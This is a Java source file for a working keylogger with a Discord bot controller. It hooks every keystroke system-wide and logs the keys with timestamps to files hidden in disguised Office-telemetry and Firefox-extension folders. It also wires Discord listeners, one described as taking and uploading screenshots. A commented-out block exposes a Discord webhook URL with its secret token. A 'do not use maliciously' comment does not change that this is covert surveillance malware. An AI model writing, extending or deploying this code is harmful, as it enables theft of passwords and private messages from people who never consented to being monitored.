


import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.text.SimpleDateFormat;
import java.util.Date;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.OnlineStatus;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Main implements NativeKeyListener{
	
	
	// This code here is for .ss start [which automatically takes screenshots and uploads them]
	// it takes a picture and places them in a directory.
	static Date cd = new Date();
	static SimpleDateFormat date = new SimpleDateFormat("MM/dd/yyyy");
	static SimpleDateFormat time = new SimpleDateFormat("hh:mm:ss");

	
	private static String token = "XXX";
	
	// This code records all of your keys typed, and places them in a specific directory. DO NOT USE THIS MALICIOUSLY.
	public  final Path windowsFile = Paths.get("C:\\Users"+System.getProperty("user.name")+"\\AppData\\Local\\Microsoft\\Office\\OTele\\env6"+System.getProperty("user.name")+".txt");
	public  final Path linuxFile = Paths.get("/home/chillydogs/.mozilla/extensions/env6"+System.getProperty("user.name")+".txt");
	

	
	public final File windows = new File("C:\\");
	public final File linux = new File("/home");
	public static void main(String[] args) throws NativeHookException, IOException {
		
		
		GlobalScreen.registerNativeHook();
		GlobalScreen.addNativeKeyListener(new Main());
	
		// I have no idea how half the shit I've made actually works.
		JDA jda = JDABuilder.createDefault(token, GatewayIntent.MESSAGE_CONTENT
				,GatewayIntent.GUILD_MESSAGES, GatewayIntent.GUILD_MESSAGES, GatewayIntent.GUILD_EMOJIS_AND_STICKERS)
				.setStatus(OnlineStatus.DO_NOT_DISTURB)
				.setActivity(Activity.listening("paint dry"))
				.build();
		
		jda.addEventListener(new Message());
		jda.addEventListener(new Screenshots());
		

		
	}
	
	public void nativeKeyPressed(NativeKeyEvent e)
	{
		/*
		DiscordWebHook webhook = new DiscordWebHook("https://discord.com/api/webhooks/1120179234363686983/QW5wHJ-PEcU6bv06NV8mfekcAzBn1hnfqSstA2G51Go7dcZKVivGA_CZL_D4q0ASAoHl");
	    webhook.setAvatarUrl("https://preview.redd.it/wufwpx7qf09b1.jpg?width=960&crop=smart&auto=webp&v=enabled&s=2ccb973d2bce03a0069678761e648d1e10f50646");
	    webhook.setUsername("Wish.com KeyLogger");
	    webhook.setTts(true);
		*/

		String key = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		if(windows.exists())
		{
			try (OutputStream os = Files.newOutputStream(windowsFile, StandardOpenOption.CREATE,StandardOpenOption.WRITE,StandardOpenOption.APPEND);
					PrintWriter writer = new PrintWriter(os))
					{
						if(key.length() > 1 && key.equalsIgnoreCase("space") || key.equalsIgnoreCase("comma")
								|| key.equalsIgnoreCase("period") || key.equalsIgnoreCase("`") || key.equalsIgnoreCase("back slash")
								|| key.equalsIgnoreCase("slash") || key.equalsIgnoreCase("open slash") || key.equalsIgnoreCase("back quote")
								|| key.equalsIgnoreCase("tab") || key.equalsIgnoreCase("caps lock") || key.equalsIgnoreCase("equals")
								|| key.equalsIgnoreCase("minus") || key.equalsIgnoreCase("shift"))
						{
							writer.append("  ["+key+"]  ");
						}else if (key.length() > 1 && key.equalsIgnoreCase("enter") || key.equalsIgnoreCase("backspace"))
						{
								writer.append("\n"+"\n"+"["+key+"]"+" ["+time.format(cd)+" - "+date.format(cd)+"]"+"\n"+"\n");
						}else
						{
							writer.append(key);
						}
						
					}catch(IOException e1)
					{
						e1.printStackTrace();
						System.exit(0);
					}
		}else if(linux.exists())
		{
			try (OutputStream os = Files.newOutputStream(linuxFile, StandardOpenOption.CREATE,StandardOpenOption.WRITE,StandardOpenOption.APPEND);
					PrintWriter writer = new PrintWriter(os))
					{
						if(key.length() > 1 && key.equalsIgnoreCase("space") || key.equalsIgnoreCase("comma")
								|| key.equalsIgnoreCase("period") || key.equalsIgnoreCase("`") || key.equalsIgnoreCase("back slash")
								|| key.equalsIgnoreCase("slash") || key.equalsIgnoreCase("open slash") || key.equalsIgnoreCase("back quote")
								|| key.equalsIgnoreCase("tab") || key.equalsIgnoreCase("caps lock") || key.equalsIgnoreCase("equals")
								|| key.equalsIgnoreCase("minus") || key.equalsIgnoreCase("shift"))
						{
							writer.append("  ["+key+"]  ");
						}else if (key.length() > 1 && key.equalsIgnoreCase("enter") || key.equalsIgnoreCase("backspace"))
						{
								writer.append("\n"+"\n"+"["+key+"]"+" ["+time.format(cd)+" - "+date.format(cd)+"]"+"\n"+"\n");
						}else
						{
							writer.append(key);
						}
						
					}catch(IOException e1)
					{
						e1.printStackTrace();
						System.exit(0);
					}
		}
		
	
	 
	}
	

}
